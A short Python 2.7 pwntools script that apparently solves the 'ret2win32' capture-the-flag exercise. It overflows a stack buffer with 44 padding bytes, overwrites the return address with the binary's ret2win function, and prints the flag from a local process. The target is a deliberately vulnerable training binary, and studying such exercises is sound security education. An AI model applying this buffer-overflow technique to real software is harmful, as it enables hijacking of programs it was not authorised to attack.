#!/usr/bin/python2.7

import os
from pwn import *

elf = ELF('./ret2win32')

payload = "A"*44 + p32(elf.symbols['ret2win'])

r = process('./ret2win32')

r.recvuntil('>')
r.sendline(payload)
r.recv()
log.success("Flag: " + r.recv())
